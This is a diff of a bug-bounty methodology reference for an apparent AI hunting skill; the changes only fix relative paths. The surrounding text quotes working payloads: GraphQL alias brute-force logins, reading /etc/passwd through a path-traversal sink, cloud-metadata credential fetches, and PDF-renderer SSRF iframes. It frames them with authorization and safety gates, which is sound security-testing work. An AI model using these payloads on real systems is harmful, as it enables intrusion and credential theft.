@@ -2,7 +2,7 @@
 
 Companion to the `hunt` skill (`../SKILL.md`). Covers: expanded method detail for the eleven bug-bounty playbooks (PB-1–PB-11), program-scope and report-quality triage detail, provenance caveats, and FP-rule refinements.
 
-All techniques are for authorized testing only — targets named in the scope manifest, entitled labs, or programs whose written policy permits the technique. Step gates (G0–G3) are defined in `../safety-gates`; this reference adds the method depth beneath those gates. Report triage and harm-gate mechanics point at `../reporter`. Where a source is self-published or partially unverifiable, that is stated — no technique is asserted beyond what its source documents.
+All techniques are for authorized testing only — targets named in the scope manifest, entitled labs, or programs whose written policy permits the technique. Step gates (G0–G3) are defined in `../../safety-gates`; this reference adds the method depth beneath those gates. Report triage and harm-gate mechanics point at `../../reporter`. Where a source is self-published or partially unverifiable, that is stated — no technique is asserted beyond what its source documents.
 
 ---
 
@@ -38,7 +38,7 @@ All techniques are for authorized testing only — targets named in the scope ma
 - Probe object-level auth with two of your own accounts: PortSwigger's `query { product(id: 3) { id name listed } }` shape (delisted object) and cross-account `updateProfile(username:...)` mutations. Auth wired "to the front door" but forgotten per-resolver is the BOLA/ATO pivot.
 
 **Abuse primitives — authorized targets only:**
-- Aliased single-POST shape: `mutation{bruteforce0:login(input:{username:"...",password:"..."}){token success}}` … `bruteforce99:...` — delete the `variables` dict and `operationName`; search the response for the alias returning `true`/a token. Request-count rate limiters are architecturally defeated by aliases and JSON-array batching (`[{"query":"..."},{"query":"..."}]`). **Gate note:** the credential-guessing variant is prohibited on live targets by the safety gates (`../safety-gates`) — demonstrate limiter bypass with harmless aliased operations on authorized targets and practice the credential variant only in labs (e.g., PortSwigger race/GraphQL labs). Scope-proof (the program-policy line permitting credential attacks) must accompany any such evidence or the report is dead on triage.
+- Aliased single-POST shape: `mutation{bruteforce0:login(input:{username:"...",password:"..."}){token success}}` … `bruteforce99:...` — delete the `variables` dict and `operationName`; search the response for the alias returning `true`/a token. Request-count rate limiters are architecturally defeated by aliases and JSON-array batching (`[{"query":"..."},{"query":"..."}]`). **Gate note:** the credential-guessing variant is prohibited on live targets by the safety gates (`../../safety-gates`) — demonstrate limiter bypass with harmless aliased operations on authorized targets and practice the credential variant only in labs (e.g., PortSwigger race/GraphQL labs). Scope-proof (the program-policy line permitting credential attacks) must accompany any such evidence or the report is dead on triage.
 - GET-mutation check: `curl -G https://target/graphql --data-urlencode 'query=mutation{updateEmail(email:"attacker-owned@example.com"){id}}'` — against your own test account.
 - ATO candidates = identity mutations: password-reset, email-change, OTP, token-issuance — especially arbitrary `username`/`email` args (one-POST takeover).
 
@@ -69,7 +69,7 @@ All techniques are for authorized testing only — targets named in the scope ma
 - Unused safe sibling: a neighboring package resolved every path through `_resolve_safe()`; the vulnerable `read_source_code_file` never called it. Reference vulnerable shape: `read_source_code_file(file_path: str, max_lines: int = 200)` with `Path(file_path)` + `p.read_text(...)` and no confinement.
 
 **Direct sink PoC (no model in the loop):**
-- `python -c "from the_tool import read_source_code_file; print(read_source_code_file('/etc/passwd')[:200])"` — or, for the honest variant, read a benign file you planted outside the project (`/tmp/outside-project/secret.txt` containing `FAKE_TOKEN=not-a-real-key`). Deterministic, no credentials, no cloud account. **Never exfiltrate real secrets** (see `../safety-gates`).
+- `python -c "from the_tool import read_source_code_file; print(read_source_code_file('/etc/passwd')[:200])"` — or, for the honest variant, read a benign file you planted outside the project (`/tmp/outside-project/secret.txt` containing `FAKE_TOKEN=not-a-real-key`). Deterministic, no credentials, no cloud account. **Never exfiltrate real secrets** (see `../../safety-gates`).
 
 **Cloud metadata probes (vendor-doc verified):**
 - AWS IMDSv1: plain GET `http://169.254.169.254/latest/meta-data/`; IMDSv2: `curl -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600"` then `curl -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/` (401 without token when required; IPv6 `fd00:ec2::254`; PUT carrying X-Forwarded-For rejected).
@@ -221,8 +221,8 @@ Prior art from the same source: Keybase invite-limit bypass (hackerone.com/repor
 2. **Benign-markup survival probe:** inject a stray `</iframe>`; "generating the PDF caused the iframe to be rendered in the downloaded PDF as well" proves server-side rendering.
 3. **Error-path reflection:** deliberately trigger error conditions — the only vector in the reference case was `"Missing template for element: #{element[:template]}"` interpolating the user value into `html_without_layout` fed to the PDF library. Audit every interpolation landing in rendered HTML, especially exception paths nobody sanitizes.
 4. **Confirm blind SSRF first:** point the injected markup at an out-of-band listener (Burp Collaborator/OAST); a DNS+HTTP callback from the app server's IP distinguishes server-side rendering from client behavior. Keep the listener within the permitted controlled endpoints.
-5. **Internal pivoting [G3]:** the AppSecCo two-step — `<iframe src="http://169.254.169.254/latest/meta-data/iam/security-credentials/"></iframe>` lists role names, then the role-specific path renders credential JSON into the PDF. Requires the G3 gate (internal-network reachability — `../safety-gates`); per-cloud header requirements decide what can work (see PB-2 probes; Azure headerless fallback `/metadata/v1/instanceinfo`; ECS creds at `http://169.254.170.2/v2/credentials/<GUID>`; IPv6 alias `http://[fd00:ec2::254]` bypasses IPv4-only filters).
-6. **Credential validation:** present redacted evidence and request owner-side validation — the safety gates (`../safety-gates`) prohibit using discovered production credentials to obtain deeper access; `aws sts get-caller-identity` / enumerate-iam (github.com/andresriancho/enumerate-iam) runs only in lab or owner-approved settings.
+5. **Internal pivoting [G3]:** the AppSecCo two-step — `<iframe src="http://169.254.169.254/latest/meta-data/iam/security-credentials/"></iframe>` lists role names, then the role-specific path renders credential JSON into the PDF. Requires the G3 gate (internal-network reachability — `../../safety-gates`); per-cloud header requirements decide what can work (see PB-2 probes; Azure headerless fallback `/metadata/v1/instanceinfo`; ECS creds at `http://169.254.170.2/v2/credentials/<GUID>`; IPv6 alias `http://[fd00:ec2::254]` bypasses IPv4-only filters).
+6. **Credential validation:** present redacted evidence and request owner-side validation — the safety gates (`../../safety-gates`) prohibit using discovered production credentials to obtain deeper access; `aws sts get-caller-identity` / enumerate-iam (github.com/andresriancho/enumerate-iam) runs only in lab or owner-approved settings.
 7. **Engine pivot payloads when `<iframe>` is filtered:** headless Chromium accepts `<embed src>`, `<input type="image" src>`, `<video src>`, `<audio src>`, `<svg src>`, `<base href>`, `<meta http-equiv="refresh" content="0; url=...">`, or JS `fetch('http://127.0.0.1').then(async r=>document.write(await r.text()))`; wkhtmltopdf yields local file read via `<iframe src="file:///etc/passwd">` unless `--disable-local-file-access` is set; `file:///proc/self/environ` leaks `AWS_CONTAINER_CREDENTIALS_RELATIVE_URI` (ECS).
 8. **URL→PDF SaaS APIs** (`POST {"url": "..."}`): the `url` parameter fetches any target server-side — supply an OAST listener first, then the metadata endpoint; the fetch is blind unless rendering errors are returned.
 9. **Renderer fingerprinting:** grep received PDFs' metadata for vendor strings — "Skia/PDF m65" = headless Chrome v65 (JS executes; fetch/XHR available) vs wkhtmltopdf/WeasyPrint (no JS, but `file://` iframes and CSS `url()` fetches still fire).
@@ -293,7 +293,7 @@ Prior art from the same source: Keybase invite-limit bypass (hackerone.com/repor
 
 # PART 2 — REPORT-QUALITY TRIAGE & PROGRAM-SCOPE DETAIL
 
-Owner-audit reporting (`../reporter`) remains the default output; this section supplies the triage-facing layer for bounty-program engagements. The report-quality gate in `../reporter` is the gate; this section is the depth. The harm gate (`../reporter`) runs FIRST: a finding must clear the seven reportability questions before the seven quality questions mean anything.
+Owner-audit reporting (`../../reporter`) remains the default output; this section supplies the triage-facing layer for bounty-program engagements. The report-quality gate in `../../reporter` is the gate; this section is the depth. The harm gate (`../../reporter`) runs FIRST: a finding must clear the seven reportability questions before the seven quality questions mean anything.
 
 ## The seven report-quality questions — scoring notes
 
@@ -310,10 +310,10 @@ Owner-audit reporting (`../reporter`) remains the default output; this section s
 ## Chain-aggregation rule (full statement)
 
 - **Trigger:** two or more independently LOW or INFORMATIONAL findings whose combination produces a higher-severity outcome.
-- **Demonstration requirement:** the chain itself must be demonstrated end-to-end with owned resources (five low OAuth flaws chained into private-repo takeover; CAPTCHA bypass + privileged-event disclosure as one kill chain). Links that were not exercised are classified Supported but not fully validated or Hypothetical per the outcome classes in `../evidence` — explicitly, in the report.
+- **Demonstration requirement:** the chain itself must be demonstrated end-to-end with owned resources (five low OAuth flaws chained into private-repo takeover; CAPTCHA bypass + privileged-event disclosure as one kill chain). Links that were not exercised are classified Supported but not fully validated or Hypothetical per the outcome classes in `verification.md` — explicitly, in the report.
 - **Severity argument:** from the demonstrated chain impact, never the sum of component severities; component severities do not add.
 - **Structure:** one chain narrative; components listed separately with their own evidence; components stay individually reportable only if the program prefers component reports — do not double-report both forms.
-- **The attack-path analysis worker (see `../orchestrator`) owns the aggregation**; the outcome classes in `../evidence` govern each link's classification.
+- **The attack-path analysis worker (see `../../orchestrator`) owns the aggregation**; the outcome classes in `verification.md` govern each link's classification.
 
 ## Duplicate-avoidance procedure
 
@@ -329,7 +329,7 @@ Owner-audit reporting (`../reporter`) remains the default output; this section s
 - **Cite public norm text where it exists:** RFC 9700 §2.3 for token-audience confusion; RFC 6749 §4.1.2/§4.1.3 for code binding; the provider's own documentation for redirect-matching and PKCE warnings; the SAML Profiles replay-detection requirement.
 - **Map to the program taxonomy:** a finding must map to the program's impact examples to be payable (Safe's four examples); for platform programs use HackerOne/Bugcrowd VRT where applicable and CWE for root cause; use the program's own severity matrix as the argument frame.
 - **Demonstrated vs plausible, in writing:** state what you showed (the insecure sink, the accepted assertion, the redeemed artifact) and what is plausible (the model-dependent chain, the mobile-login path); make precise non-claims (did NOT access real customer devices/feeds/recordings; did NOT measure cost amplification).
-- **Scope-proof ships with the report:** the program-policy line permitting credential-, concurrency-, or auth-bypass-class techniques must accompany the evidence — "or the report is dead on triage". The safety gates (`../safety-gates`) still prohibit credential brute-forcing on live targets regardless of program policy; where the technique is prohibited by the gates, report the limiter weakness with a harmless-operation demonstration and a lab reference.
+- **Scope-proof ships with the report:** the program-policy line permitting credential-, concurrency-, or auth-bypass-class techniques must accompany the evidence — "or the report is dead on triage". The safety gates (`../../safety-gates`) still prohibit credential brute-forcing on live targets regardless of program policy; where the technique is prohibited by the gates, report the limiter weakness with a harmless-operation demonstration and a lab reference.
 - **Remediation expectations:** note known patterns (next-day confirmation + ~6-month close for enterprise SSO; ~14-hour fix when the impact proof was minimal and reversible) so triage and reporter expectations align.
 
 ## Program-scope awareness — intake procedure
@@ -344,4 +344,4 @@ Owner-audit reporting (`../reporter`) remains the default output; this section s
 
 ## Boundary
 
-Submission is always a researcher decision. The safety gates (`../safety-gates`) prohibit automatic submission to third parties; the triage gate prepares the report, it does not send it. All testing remains inside the G0–G3 gates and the stop conditions defined in `../safety-gates`.
+Submission is always a researcher decision. The safety gates (`../../safety-gates`) prohibit automatic submission to third parties; the triage gate prepares the report, it does not send it. All testing remains inside the G0–G3 gates and the stop conditions defined in `../../safety-gates`.
